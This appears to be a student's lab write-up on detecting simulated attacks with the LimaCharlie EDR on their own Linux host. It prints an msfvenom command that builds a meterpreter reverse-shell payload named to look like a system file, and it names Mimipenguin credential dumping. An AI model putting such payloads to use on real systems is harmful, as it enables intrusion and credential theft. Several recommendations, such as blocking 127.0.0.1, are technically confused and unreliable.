# Limacharlie-endpoint-investigation


Title: Limacharlie endpoint investigation 

Date: May 25th 2026

Analyst: Savon Masters

					                                          Summary

That attacks that remain on the endpoint are an issue to the device and the user. Every EDR gives visibility, chain of events, and offensive actions to stop processes' behaviors. All of this was true when I learned tools that were monitored on the entire system. 

			                                            Investigation 

![image alt](https://github.com/SavonMasters/Limacharlie-endpoint-investigation/blob/591454cdafb8f7f20d1a70270a640687256c1396/Screenshot%20(7).png)
![image alt](https://github.com/SavonMasters/Limacharlie-endpoint-investigation/blob/ae9e49c9675419d53ca32d4ecf146bf5d9ecf41c/Screenshot%20from%202026-05-26%2017-57-57.png)
I configured and downloaded Limacharlie Endpoint detection and response to my Linux host and impersonated an attacker actions with my own commands, and a pack of security tools titled “NMAP”, “Metasploit”, and “Mimipenguin”.



I set up a port scan on my host with the command “nmap -p 21,22,23,25,53,80,443” and changing up to Limacharlie I was able to see the command being ran with the timeline feature. 





Now I initiated metaspoilt instructing msconsole to fix a reverse_tcp to my host “127.0.0.1” on port “4444” going on ahead I prompted msfvenom to download a payload to my host showing the command for a file“msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf > Systemfiles.elf” then made Systemfiles.elf an exe and executed it. 




I was told information that a process going by the name of “Systemfiles.elf” was downloaded. I went to processes in Limacharlie and could evaluate it, in that location I found the process ID “16175”, file path “/home/vboxuser/Systemfiles.elf”, command line “./Systemfile.elf” and network connection that developed it “Source IP address 127.0.0.1.44446 Destination IP address 127.0.0.1.4444”. My redemeditation technique was to kill the process and the reverse_tcp connection tells the user that the process was killed in msfvenom.





I gave “Mimipenguin” an opportunity to dump credentials; none were found even so I created a detection and response rule as a warning wall to alert if the exploit is used and it stated there was one into my feed. 


						                                          Conclusion 

All of the events noted that an increased amount of attacks took place featuring; port scanning, a C2 tunnel, an unknown process being downloaded, and credential dump. A common solution to these problems are create a detection rule for port scanning, disconnect the C2 tunnel, and break the process off. How fast this investigation went is all equal to the EDR being applied. 


							                                            IOCs

* The option “NMAP” being active.
* The IP address “127.0.0.1” port scanning the computer.
* The network connector “Metasploit” speaking to the system.
* With the command “msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf > Systemfiles.elf” to start a path between “127.0.0.144446” and “127.0.0.14444”.
* The process “Systemfiles.elf” process ID “16175” being the connector for the C2 tunnel.
* “Mimipenguin” being requested on the system.


					                                          	Recommendations 

* Block the IP address “127.0.0.1”
* Ban “NMAP” from being used on the system.
* Lose the C2 transmissions from receiving.
* The object “Metasploit” should not be allowed on the system. 
* Update the settings of the “Systemfiles.elf” elf file to not be an executable and send it off the system.
* Harden the compartments of passwords it would make “Mimipenguin” be unreachable to data.
* Any other time “Mimipenguin” is told to search the system there will be a detection rule. 


					                                              	Things I learned 

* Be unnoticed while pulling host information remotely.
* Being speedy movements to deploy the incident response foundations. 
* Intake all of Limacharlie's powers to have an endpoint defendable. 
* Go as you need and tighten the events presented to the organization.  
